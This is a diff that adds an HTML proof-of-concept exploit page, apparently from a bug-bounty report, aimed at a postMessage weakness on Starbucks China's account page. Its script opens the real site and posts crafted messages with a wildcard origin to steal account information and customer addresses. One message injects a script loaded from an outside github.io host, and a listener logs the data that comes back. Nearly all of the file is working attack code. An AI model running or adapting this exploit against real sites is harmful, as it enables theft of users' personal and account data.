@@ -1,0 +1,44 @@
+
+<!DOCTYPE html>
+<html>
+<head>
+<title>Get the sensitive information by postmessage</title>
+<meta name="referrer" content="never">
+</head>
+<body>
+<button id="openH1">Click Here for start</button>
+<button id="stealaccount">steal account information</button>
+<button id="stealcustom">steal customer address</button>
+<script>
+var h1Win;
+var s;
+function openWin(){
+	h1Win = window.open("https://www.starbucks.com.cn/account/#/");
+	}
+
+	function sendMessage(){
+var data = JSON.stringify({"message":{"type":13}});
+	h1Win.postMessage(data,"*");
+        console.log("postmessage successed for account!")
+			}
+
+function sendMessage1(){
+var data = JSON.stringify({"message":{"type":3,"noVerify":1,"subsid":1,"src":"data:text/html, <html><script src='https://https://koffdsa.github.io/js/poc.js'></html>//","captype":1,"subcaptype":1}});
+	h1Win.postMessage(data,"*");
+        console.log("postmessage successed for customer!")
+			}
+ 
+    // 接受server返回数据
+    window.addEventListener('message', function(e) {
+        console.log('Get data from starbucks ---> ' + e.data);
+	//clearInterval(s);
+    }, false);
+document.getElementById("openH1").addEventListener('click', openWin);
+document.getElementById("stealaccount").addEventListener('click', sendMessage);
+document.getElementById("stealcustom").addEventListener('click', sendMessage1);
+openWin();
+sendMessage();
+sendMessage1();
+</script>
+</body>
+</html>
